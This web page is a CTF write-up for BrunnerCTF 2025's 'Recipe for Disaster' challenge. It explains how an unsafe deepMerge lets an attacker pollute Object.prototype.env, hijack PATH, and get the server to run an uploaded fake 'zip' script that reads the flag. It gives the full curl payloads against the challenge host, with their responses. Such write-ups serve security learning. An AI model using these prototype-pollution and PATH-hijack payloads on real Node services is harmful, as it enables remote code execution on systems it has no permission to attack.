<!doctype html><html lang=en><head><title>BrunnerCTF 2025 - WEB Recipe for Disaster · Anthrace | CTF Writeups</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="Anthrace"><meta name=description content="
This challenge demonstrates a classic prototype pollution vulnerability that leads to remote code execution through PATH hijacking. We exploit a dangerous deepMerge function to pollute Object.prototype.env, hijack the system&rsquo;s PATH variable, and execute a malicious binary disguised as the legitimate zip command.

  Overview & Attribution
  
    
    Link to heading
  

When I first tackled this challenge, I had a gut feeling we were dealing with prototype pollution. But the real “enlightment” moment came when I found an epic writeup Mizu at mizu.re. This absolute legend in the web security game, and his breakdown of a similar exploit was like finding the perfect recipe for this challenge. If you’re into this stuff, you have to check out Mizu’s work. His DOMPurify research is really insane.
Huge props to them for sharing knowledge that helps us all level up!"><meta name=keywords content="ctf,hacking,cybersecurity,writeups,web,osint,forensic,crypto"><meta name=twitter:card content="summary"><meta name=twitter:title content="BrunnerCTF 2025 - WEB Recipe for Disaster"><meta name=twitter:description content="This challenge demonstrates a classic prototype pollution vulnerability that leads to remote code execution through PATH hijacking. We exploit a dangerous deepMerge function to pollute Object.prototype.env, hijack the system’s PATH variable, and execute a malicious binary disguised as the legitimate zip command.
Overview & Attribution Link to heading When I first tackled this challenge, I had a gut feeling we were dealing with prototype pollution. But the real “enlightment” moment came when I found an epic writeup Mizu at mizu.re. This absolute legend in the web security game, and his breakdown of a similar exploit was like finding the perfect recipe for this challenge. If you’re into this stuff, you have to check out Mizu’s work. His DOMPurify research is really insane. Huge props to them for sharing knowledge that helps us all level up!"><meta property="og:url" content="https://anthr4ce.github.io/ctf-writeups/brunnerctf-2025/web/"><meta property="og:site_name" content="Anthrace | CTF Writeups"><meta property="og:title" content="BrunnerCTF 2025 - WEB Recipe for Disaster"><meta property="og:description" content="This challenge demonstrates a classic prototype pollution vulnerability that leads to remote code execution through PATH hijacking. We exploit a dangerous deepMerge function to pollute Object.prototype.env, hijack the system’s PATH variable, and execute a malicious binary disguised as the legitimate zip command.
Overview & Attribution Link to heading When I first tackled this challenge, I had a gut feeling we were dealing with prototype pollution. But the real “enlightment” moment came when I found an epic writeup Mizu at mizu.re. This absolute legend in the web security game, and his breakdown of a similar exploit was like finding the perfect recipe for this challenge. If you’re into this stuff, you have to check out Mizu’s work. His DOMPurify research is really insane. Huge props to them for sharing knowledge that helps us all level up!"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="ctf-writeups"><meta property="article:published_time" content="2025-07-01T00:00:00+00:00"><meta property="article:modified_time" content="2025-07-01T00:00:00+00:00"><meta property="article:tag" content="BrunnerCTF"><meta property="article:tag" content="Web"><meta property="article:tag" content="Writeup"><meta property="article:tag" content="Prototype-Pollution"><link rel=canonical href=https://anthr4ce.github.io/ctf-writeups/brunnerctf-2025/web/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.6445a802b9389c9660e1b07b724dcf5718b1065ed2d71b4eeaf981cc7cc5fc46.css integrity="sha256-ZEWoArk4nJZg4bB7ck3PVxixBl7S1xtO6vmBzHzF/EY=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/custom.min.92a8af9d939d71a5316be0e14fcee81d71b93ab020897940098bf1c492367587.css integrity="sha256-kqivnZOdcaUxa+DhT87oHXG5OrAgiXlACYvxxJI2dYc=" crossorigin=anonymous media=screen><link rel=icon type=image/svg+xml href=/images/favicon.svg sizes=any><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-light"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=https://anthr4ce.github.io/>Anthrace | CTF Writeups
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/ctf-writeups/>Writeups</a></li><li class=navigation-item><a class=navigation-link href=/whoami/>Whoami</a></li></ul></section></nav><div class=content><section class="container page"><article><header><h1 class=title><a class=title-link href=https://anthr4ce.github.io/ctf-writeups/brunnerctf-2025/web/>BrunnerCTF 2025 - WEB Recipe for Disaster</a></h1></header><hr><p>This challenge demonstrates a classic prototype pollution vulnerability that leads to remote code execution through PATH hijacking. We exploit a dangerous <code>deepMerge</code> function to pollute <code>Object.prototype.env</code>, hijack the system&rsquo;s PATH variable, and execute a malicious binary disguised as the legitimate <code>zip</code> command.</p><h2 id=overview--attribution>Overview & Attribution
<a class=heading-link href=#overview--attribution><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>When I first tackled this challenge, I had a gut feeling we were dealing with prototype pollution. But the real “enlightment” moment came when I found an epic writeup <strong>Mizu</strong> at <a href=https://mizu.re/post/infinite-mario class=external-link target=_blank rel=noopener>mizu.re</a>. This absolute legend in the web security game, and his breakdown of a similar exploit was like finding the perfect recipe for this challenge. If you’re into this stuff, you have to check out Mizu’s work. His DOMPurify research is really insane.
Huge props to them for sharing knowledge that helps us all level up!</p><h2 id=vulnerability-analysis>Vulnerability Analysis
<a class=heading-link href=#vulnerability-analysis><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><h3 id=the-root-cause-unsafe-object-merging>The Root Cause: Unsafe Object Merging
<a class=heading-link href=#the-root-cause-unsafe-object-merging><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h3><p>The core vulnerability lies in the <code>deepMerge</code> function within <code>server.js</code>. This function exhibits several dangerous characteristics:</p><ul><li><strong>Unvalidated recursive merging</strong> - No sanitization of property names during merge operations</li><li><strong>Dangerous prototype access</strong> - Allows modification of <code>constructor.prototype.*</code> properties</li><li><strong>Global pollution impact</strong> - Enables attackers to modify <code>Object.prototype</code>, affecting all objects application-wide</li></ul><h3 id=the-attack-strategy>The Attack Strategy
<a class=heading-link href=#the-attack-strategy><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h3><p>Our exploitation follows a three-stage process:</p><ol><li><strong>Deploy Malicious Binary</strong> → Plant a fake <code>zip</code> executable via <code>/api/note</code></li><li><strong>Prototype Pollution</strong> → Poison the global prototype via <code>/api/settings</code></li><li><strong>Trigger Execution</strong> → Force the server to execute our fake binary through <code>/export</code></li></ol><h2 id=how-the-exploit-works>How The Exploit Works
<a class=heading-link href=#how-the-exploit-works><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>The key insight is understanding JavaScript&rsquo;s prototype inheritance mechanism. When the export endpoint processes our request:</p><ol><li>The server creates a <code>baseOpts</code> object for the <code>exec()</code> call</li><li>Although <code>baseOpts.env</code> doesn&rsquo;t exist as a direct property, JavaScript&rsquo;s prototype chain lookup finds our polluted <code>Object.prototype.env</code></li><li>Our controlled PATH variable (<code>/app/data/pp</code>) takes precedence over the system PATH</li><li>When <code>exec("zip -r ...")</code> runs, it finds our malicious binary first</li></ol><h3 id=the-security-bypass>The Security Bypass
<a class=heading-link href=#the-security-bypass><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h3><p>The developers attempted to prevent environment manipulation:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>delete</span> <span style=color:#a6e22e>baseOpts</span>.<span style=color:#a6e22e>env</span>;
</span></span></code></pre></div><p>However, this only removes direct properties - inherited properties from the prototype chain survive. Our pollution lives in the prototype, not on the object itself, so it persists through this &ldquo;cleanup&rdquo; attempt.</p><h2 id=exploitation-steps>Exploitation Steps
<a class=heading-link href=#exploitation-steps><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><h3 id=step-1-deploy-malicious-binary>Step 1: Deploy Malicious Binary
<a class=heading-link href=#step-1-deploy-malicious-binary><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h3><p>First, we create a fake <code>zip</code> executable that will read and return the flag:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl -s -X POST https://recipe-for-disaster-400f8ea7714c3712.challs.brunnerne.xyz/api/note <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  -d <span style=color:#e6db74>&#39;name=pp&#39;</span> -d <span style=color:#e6db74>&#39;filename=zip&#39;</span> -d <span style=color:#e6db74>$&#39;content=#!/bin/sh\nread line &lt; /flag.txt; echo $line&#39;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  -d <span style=color:#e6db74>&#39;makeExecutable=true&#39;</span>
</span></span></code></pre></div><p><img src=images/image1.png alt=Screenshot></p><p><strong>Expected response:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;ok&#34;</span>:true,<span style=color:#e6db74>&#34;path&#34;</span>:<span style=color:#e6db74>&#34;data/pp/zip&#34;</span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p><strong>What&rsquo;s happening:</strong> We&rsquo;re planting a malicious executable disguised as the legitimate <code>zip</code> command. The server thinks it&rsquo;s just storing a harmless note, but we&rsquo;re actually placing an executable file in <code>/app/data/pp/zip</code>. When executed, our fake <code>zip</code> will read the flag file instead of creating an archive. The key is the <code>makeExecutable=true</code> parameter which gives our file execution permissions.</p><h3 id=step-2-execute-prototype-pollution>Step 2: Execute Prototype Pollution
<a class=heading-link href=#step-2-execute-prototype-pollution><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h3><p>Next, we pollute the prototype to hijack the PATH environment variable:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl -s -X POST https://recipe-for-disaster-400f8ea7714c3712.challs.brunnerne.xyz/api/settings <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  -H <span style=color:#e6db74>&#39;Content-Type: application/json&#39;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  -d <span style=color:#e6db74>&#39;{&#34;exportOptions&#34;:{&#34;constructor&#34;:{&#34;prototype&#34;:{&#34;env&#34;:{&#34;PATH&#34;:&#34;/app/data/pp&#34;}}}}}&#39;</span>
</span></span></code></pre></div><p><img src=images/image2.png alt=Screenshot></p><p><strong>Expected response:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;ok&#34;</span>:true,<span style=color:#e6db74>&#34;settings&#34;</span>:<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;theme&#34;</span>:<span style=color:#e6db74>&#34;brunsviger&#34;</span>,<span style=color:#e6db74>&#34;glaze&#34;</span>:<span style=color:#e6db74>&#34;brown-sugar&#34;</span>,<span style=color:#e6db74>&#34;exportOptions&#34;</span>:<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;timeout&#34;</span>:5000,<span style=color:#e6db74>&#34;maxBuffer&#34;</span>:1048576<span style=color:#f92672>}}}</span>
</span></span></code></pre></div><p><strong>What&rsquo;s happening:</strong> This is where the magic happens. We&rsquo;re exploiting the unsafe <code>deepMerge</code> function to pollute the global <code>Object.prototype</code>. By navigating through <code>constructor.prototype</code>, we&rsquo;re essentially modifying the &ldquo;DNA&rdquo; of all JavaScript objects in the application. We set <code>Object.prototype.env = {"PATH": "/app/data/pp"}</code>, which means any object that doesn&rsquo;t have its own <code>env</code> property will inherit this one through JavaScript&rsquo;s prototype chain.</p><h3 id=step-3-trigger-remote-code-execution>Step 3: Trigger Remote Code Execution
<a class=heading-link href=#step-3-trigger-remote-code-execution><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h3><p>Finally, we trigger the export functionality to execute our malicious binary:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl -s <span style=color:#e6db74>&#39;https://recipe-for-disaster-400f8ea7714c3712.challs.brunnerne.xyz/export?name=pp&#39;</span>
</span></span></code></pre></div><p><img src=images/image3.png alt=Screenshot></p><p><strong>Result - The flag is revealed:</strong></p><p><img src=images/image4.png alt=Screenshot></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>brunner{pr0t0typ3_p0llu710n_0v3rf10w1ng_7h3_0v3n}
</span></span></code></pre></div><p><strong>What&rsquo;s happening:</strong> When the export endpoint processes our request, it creates a <code>baseOpts</code> object for the <code>exec()</code> call. Here&rsquo;s the beautiful part - even though the developers tried to be secure by doing <code>delete baseOpts.env</code>, this only removes direct properties. Since <code>baseOpts</code> doesn&rsquo;t have its own <code>env</code> property, JavaScript looks up the prototype chain and finds our polluted <code>Object.prototype.env</code> with the controlled PATH.</p><p>When the server executes <code>exec("zip -r ...")</code>, the system searches for the <code>zip</code> binary using our hijacked PATH (<code>/app/data/pp</code>), finds our malicious executable first, and runs it instead of the legitimate zip command. Game over - our fake zip reads and outputs the flag!</p><hr><p><strong>Flag:</strong> <code>brunner{pr0t0typ3_p0llu710n_0v3rf10w1ng_7h3_0v3n}</code></p></article></section></div><footer class=footer><section class=container>©
2025
Anthrace
·
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>